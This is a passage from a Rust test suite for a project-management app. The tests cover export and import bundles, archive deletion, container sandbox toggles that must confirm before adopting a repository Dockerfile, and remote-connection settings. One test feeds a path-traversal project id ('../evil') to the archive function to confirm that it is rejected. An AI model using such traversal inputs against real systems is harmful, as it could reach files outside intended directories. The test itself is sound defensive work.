        // status/order channel and deliberately ignores everything else.
        let registry = app_lib::storage::state_dir().join("projects.json");
        let mut list: serde_json::Value =
            serde_json::from_str(&fs::read_to_string(&registry).unwrap()).unwrap();
        for project in list.as_array_mut().unwrap() {
            if project["id"] == serde_json::Value::String(id.clone()) {
                project["vm"] = serde_json::json!({ "cpus": 2 });
            }
        }
        fs::write(&registry, serde_json::to_string_pretty(&list).unwrap()).unwrap();

        let preview = preview_project_export(id.clone()).expect("preview");
        assert_eq!(preview.blocked.as_deref(), Some("vm"));

        let bundle = home.join(concat!("vm.", app_lib::app_slug!(), "proj"));
        let err = export_project_blocking(full_export(&id, &bundle), &mut |_, _| {})
            .expect_err("a VM project must be refused");
        assert!(err.contains("VM"), "{err}");
        assert!(!bundle.exists(), "nothing may be written for a refused export");
    });
}

/// Exporting without the file sections still produces a usable bundle: the
/// settings and tabs travel, the tree does not, and the import says so.
#[test]
fn a_metadata_only_export_imports_as_an_empty_folder_with_a_note() {
    with_isolated_home("transfer-meta-home", |home| {
        let target = tempdir_in_test_projects("transfer-meta-target");
        let entry = new_local_project("meta-project", target.path());
        let id = entry.id.clone();

        let bundle = home.join(concat!("meta.", app_lib::app_slug!(), "proj"));
        let mut req = full_export(&id, &bundle);
        req.include_files = false;
        let report = export_project_blocking(req, &mut |_, _| {}).expect("export");
        assert_eq!(report.files, 0);
        assert!(report.notes.iter().any(|n| n == "noFiles"));

        let landing = tempdir_in_test_projects("transfer-meta-landing");
        let result = import_project_export_blocking(plain_import(&bundle, landing.path()))
            .expect("import");
        assert!(result.notes.iter().any(|n| n == "noFiles"));
        assert_eq!(result.files, 0);
        assert!(PathBuf::from(&result.directory).is_dir());
        assert!(PathBuf::from(&result.directory).join("project.json").exists());
        assert!(!PathBuf::from(&result.directory).join("notes.txt").exists());
    });
}

#[test]
fn permanent_delete_removes_archived_project() {
    with_isolated_home("archive-del-home", |_| {
        let target = tempdir_in_test_projects("archive-del-target");
        let entry = new_local_project("del-project", target.path());
        let id = entry.id.clone();

        archive_project_blocking(id.clone(), "2026-07-01T00:00:00+00:00".to_string()).expect("archive");
        assert_eq!(list_archived_projects().unwrap().len(), 1);

        delete_archived_project(id.clone()).expect("delete forever");
        assert!(
            list_archived_projects().unwrap().is_empty(),
            "archive must be empty after permanent delete"
        );
        // Restoring a permanently-deleted project is an error (nothing to read).
        assert!(restore_archived_project_blocking(id).is_err());
    });
}

/// Project containers, Phase 0: the toggle must be **spec-preserving** —
/// re-enabling used to write `SandboxSpec::default()`, wiping hand-tuned
/// `image`/`memory`/`network`/…. Only `enabled` flips now; the knobs survive a
/// disable/enable round-trip in BOTH stores. And an in-repo `Dockerfile` is
/// never adopted silently (O#143): the first enable must come back
/// `NeedsConfirmation`, and only an explicit matching decision writes it.
#[test]
fn set_project_sandbox_preserves_spec_and_confirms_dockerfile() {
    with_isolated_home("sandbox-home", |_| {
        let target = tempdir_in_test_projects("sandbox-target");
        let entry = new_local_project("sandbox-project", target.path());
        let id = entry.id.clone();

        // The project carries a root Dockerfile → enabling must ask first,
        // not adopt it — `docker build` would run its `RUN` steps as root.
        fs::write(target.path().join("Dockerfile"), "FROM debian:stable\n").expect("dockerfile");
        let outcome = set_project_sandbox(id.clone(), true, None).expect("enable");
        let source = match outcome {
            SandboxToggleOutcome::NeedsConfirmation { source } => source,
            SandboxToggleOutcome::Applied { .. } => {
                panic!("a detected Dockerfile must not be adopted without a decision")
            }
        };
        assert_eq!(source.value, "Dockerfile");

        // A decision naming the wrong hash (stale dialog / changed file) is
        // refused the same way, not silently applied.
        let stale = set_project_sandbox(
            id.clone(),
            true,
            Some(SandboxSourceDecision {
                hash: "not-the-real-hash".to_string(),
                adopt: true,
            }),
        )
        .expect("stale decision");
        assert!(matches!(
            stale,
            SandboxToggleOutcome::NeedsConfirmation { .. }
        ));

        // The matching decision applies it.
        let spec = match set_project_sandbox(
            id.clone(),
            true,
            Some(SandboxSourceDecision {
                hash: source.hash.clone(),
                adopt: true,
            }),
        )
        .expect("confirmed enable")
        {
            SandboxToggleOutcome::Applied { spec } => spec,
            SandboxToggleOutcome::NeedsConfirmation { .. } => {
                panic!("a matching decision must apply")
            }
        };
        assert!(spec.enabled);
        assert_eq!(spec.dockerfile.as_deref(), Some("Dockerfile"));

        // Hand-tune the knobs, then flip the toggle off and back on: every
        // field must survive; only `enabled` may change. Re-enabling must not
        // re-ask — the same content was already decided about.
        let tuned = SandboxSpec {
            enabled: true,
            scope: SandboxScope::Agents,
            image: None,
            dockerfile: Some("Dockerfile".to_string()),
            pids_limit: Some(256),
            memory: Some("4g".to_string()),
            cpus: None,
            network: Some("none".to_string()),
            readonly_rootfs: true,
            spec_source_hash: Some(source.hash.clone()),
            extra: Default::default(),
        };
        set_project_sandbox_spec(id.clone(), tuned).expect("store tuned spec");

        let off = match set_project_sandbox(id.clone(), false, None).expect("disable") {
            SandboxToggleOutcome::Applied { spec } => spec,
            SandboxToggleOutcome::NeedsConfirmation { .. } => panic!("disable never asks"),
        };
        assert!(!off.enabled);
        assert_eq!(
            off.memory.as_deref(),
            Some("4g"),
            "disable must not wipe the spec"
        );

        let on = match set_project_sandbox(id.clone(), true, None).expect("re-enable") {
            SandboxToggleOutcome::Applied { spec } => spec,
            SandboxToggleOutcome::NeedsConfirmation { .. } => {
                panic!("an already-decided, unchanged Dockerfile must not re-ask")
            }
        };
        assert!(on.enabled);
        assert_eq!(on.pids_limit, Some(256));
        assert_eq!(on.memory.as_deref(), Some("4g"));
        assert_eq!(on.network.as_deref(), Some("none"));
        assert!(on.readonly_rootfs);
        assert_eq!(on.dockerfile.as_deref(), Some("Dockerfile"));
        // …including the scope: a disable/enable round-trip must not quietly put
        // the user's shells back inside the container (or take them out of it).
        assert_eq!(on.scope, SandboxScope::Agents);

        // Both stores carry the tuned spec: the projects.json mirror (what the
        // spawn path reads) and the project's own project.json.
        let entry = get_projects()
            .expect("list")
            .into_iter()
            .find(|p| p.id == id)
            .expect("entry");
        let mirrored: SandboxSpec = serde_json::from_value(
            entry
                .extra
                .get("sandbox")
                .cloned()
                .expect("sandbox mirrored"),
        )
        .expect("parse mirrored spec");
        assert!(mirrored.enabled && mirrored.readonly_rootfs);
        assert_eq!(mirrored.pids_limit, Some(256));

        let project: app_lib::schema::project::Project = serde_json::from_str(
            &fs::read_to_string(&entry.local_file).expect("read project.json"),
        )
        .expect("parse project.json");
        let stored = project.sandbox.expect("project.json carries the spec");
        assert!(stored.enabled && stored.readonly_rootfs);
        assert_eq!(stored.network.as_deref(), Some("none"));
    });
}

/// A decline must stick until the file actually changes (or every enable
/// would re-ask forever), and a changed `Dockerfile` must re-ask even though
/// the earlier content was already decided about.
#[test]
fn set_project_sandbox_decline_sticks_until_dockerfile_changes() {
    with_isolated_home("sandbox-decline-home", |_| {
        let target = tempdir_in_test_projects("sandbox-decline-target");
        let entry = new_local_project("sandbox-decline-project", target.path());
        let id = entry.id.clone();

        fs::write(target.path().join("Dockerfile"), "FROM debian:stable\n").expect("dockerfile");
        let source = match set_project_sandbox(id.clone(), true, None).expect("enable") {
            SandboxToggleOutcome::NeedsConfirmation { source } => source,
            SandboxToggleOutcome::Applied { .. } => panic!("must ask first"),
        };

        let declined = match set_project_sandbox(
            id.clone(),
            true,
            Some(SandboxSourceDecision {
                hash: source.hash.clone(),
                adopt: false,
            }),
        )
        .expect("decline")
        {
            SandboxToggleOutcome::Applied { spec } => spec,
            SandboxToggleOutcome::NeedsConfirmation { .. } => panic!("a decision must apply"),
        };
        assert!(declined.enabled);
        assert_eq!(
            declined.dockerfile, None,
            "a decline must fall back to the default image, not build the declined file"
        );

        // Disable and re-enable: the decline is unchanged content, so no re-ask.
        set_project_sandbox(id.clone(), false, None).expect("disable");
        let still_declined = set_project_sandbox(id.clone(), true, None).expect("re-enable");
        assert!(
            matches!(still_declined, SandboxToggleOutcome::Applied { .. }),
            "an unchanged decline must not re-ask"
        );

        // Now the Dockerfile's content changes — even though the container is
        // already enabled, the next enable cycle must ask again.
        set_project_sandbox(id.clone(), false, None).expect("disable again");
        fs::write(
            target.path().join("Dockerfile"),
            "FROM debian:stable\nRUN echo hi\n",
        )
        .expect("rewrite dockerfile");
        let reasked = set_project_sandbox(id.clone(), true, None).expect("re-enable after change");
        match reasked {
            SandboxToggleOutcome::NeedsConfirmation { source: new_source } => {
                assert_ne!(
                    new_source.hash, source.hash,
                    "content changed, hash must move"
                );
            }
            SandboxToggleOutcome::Applied { .. } => {
                panic!("a changed Dockerfile must re-ask, not reuse the old decision")
            }
        }
    });
}

/// O#59: a project's remote-control override writes into both stores (the
/// `projects.json` mirror `commands::terminal` reads, and `project.json` for
/// display/export) and clears cleanly back to "inherit the global setting".
#[test]
fn set_project_remote_control_writes_both_stores_and_clears() {
    with_isolated_home("remote-control-home", |_| {
        let target = tempdir_in_test_projects("remote-control-target");
        let entry = new_local_project("remote-control-project", target.path());
        let id = entry.id.clone();

        let off = set_project_remote_control(id.clone(), Some(false)).expect("force off");
        assert_eq!(off, Some(false));

        let mirrored = get_projects()
            .expect("list")
            .into_iter()
            .find(|p| p.id == id)
            .expect("entry");
        assert_eq!(
            mirrored
                .extra
                .get("remote_control")
                .and_then(|v| v.as_bool()),
            Some(false),
            "the projects.json mirror is what the spawn path reads"
        );
        let project: app_lib::schema::project::Project = serde_json::from_str(
            &fs::read_to_string(&mirrored.local_file).expect("read project.json"),
        )
        .expect("parse project.json");
        assert_eq!(project.remote_control, Some(false));

        let cleared = set_project_remote_control(id.clone(), None).expect("clear override");
        assert_eq!(cleared, None);
        let mirrored = get_projects()
            .expect("list")
            .into_iter()
            .find(|p| p.id == id)
            .expect("entry");
        assert!(
            !mirrored.extra.contains_key("remote_control"),
            "clearing must remove the field, not store null"
        );
    });
}

/// Legacy specs (predating the `dockerfile` field) parse unchanged, and a spec
/// carrying it round-trips.
#[test]
fn sandbox_spec_roundtrips_and_reads_legacy_shape() {
    let legacy: SandboxSpec =
        serde_json::from_str(r#"{"enabled":true,"image":"img:1","memory":"2g"}"#)
            .expect("legacy spec parses");
    assert!(legacy.enabled);
    assert_eq!(legacy.image.as_deref(), Some("img:1"));
    assert_eq!(legacy.dockerfile, None);

    let spec = SandboxSpec {
        enabled: true,
        dockerfile: Some("docker/Dockerfile.dev".to_string()),
        ..Default::default()
    };
    let back: SandboxSpec =
        serde_json::from_str(&serde_json::to_string(&spec).expect("serialize")).expect("parse");
    assert_eq!(back.dockerfile.as_deref(), Some("docker/Dockerfile.dev"));
}

#[test]
fn archive_rejects_traversal_ids_and_missing_projects() {
    with_isolated_home("archive-guard-home", |_| {
        assert!(archive_project_blocking("../evil".to_string(), "x".to_string()).is_err());
        assert!(archive_project_blocking("no-such-id".to_string(), "x".to_string()).is_err());
    });
}

/// The auto-connect opt-in has to survive a restart, and it is read from
/// `projects.json` (the always-local source of truth for a remote project, whose
/// own `project.json` may live behind the host) — so both copies must carry it, and
/// clearing it must *remove* the field rather than store `false`, so an opted-out
/// project is byte-identical to one that never opted in.
#[test]
fn set_project_auto_connect_writes_both_copies_and_clears() {
    with_isolated_home("auto-connect-home", |_| {
        let mirror_parent = tempdir_in_test_projects("auto-connect-mirror");
        let entry = create_project_blocking(CreateProjectRequest {
            name: "auto-connect".to_string(),
            directory: String::new(),
            description: None,
            git_type: Some("none".to_string()),
            git_provider: None,
            skip_scaffold: true,
            remote: Some(RemoteSpec {
                user: Some("alice".to_string()),
                host: "nonexistent.invalid".to_string(),
                port: None,
                remote_path: "/home/alice/work".to_string(),
                openvpn: None,
                auto_connect: None,
                key_auth: None,
                persist_sessions: None,
                vm: None,
                label: None,
                extra: Default::default(),
            }),
            mirror_parent: Some(mirror_parent.path().to_string_lossy().to_string()),
            vm: None,
        })
        .expect("create remote project");

        // Reads `auto_connect` off the entry's flattened `remote` in projects.json.
        let registered = |id: &str| -> Option<bool> {
            get_projects()
                .expect("get projects")
                .into_iter()
                .find(|p| p.id == id)?
                .extra
                .get("remote")?
                .get("auto_connect")?
                .as_bool()
        };
        let on_disk = |local_file: &str| -> Option<bool> {
            load_project(local_file.to_string())
                .expect("load project.json")
                .remote?
                .auto_connect
        };

        assert_eq!(registered(&entry.id), None, "starts opted out");

        assert!(set_project_auto_connect(entry.id.clone(), true).expect("opt in"));
        assert_eq!(registered(&entry.id), Some(true));
        assert_eq!(on_disk(&entry.local_file), Some(true));

        assert!(!set_project_auto_connect(entry.id.clone(), false).expect("opt out"));
        assert_eq!(registered(&entry.id), None, "cleared, not stored as false");
        assert_eq!(on_disk(&entry.local_file), None);
    });
}

/// A local project has no SSH connection to automate, so the opt-in must be
/// refused rather than silently written into a spec that doesn't exist.
#[test]
fn set_project_auto_connect_rejects_local_and_unknown_projects() {
    with_isolated_home("auto-connect-local-home", |_| {
        let target = tempdir_in_test_projects("auto-connect-local");
        let entry = create_project_blocking(CreateProjectRequest {
            name: "local-project".to_string(),
            directory: target.path().join("project").to_string_lossy().to_string(),
            description: None,
            git_type: Some("none".to_string()),
            git_provider: None,
            skip_scaffold: true,
            remote: None,
            mirror_parent: None,
            vm: None,
        })
        .expect("create local project");

        assert!(set_project_auto_connect(entry.id, true).is_err());
        assert!(set_project_auto_connect("no-such-id".to_string(), true).is_err());
    });
}
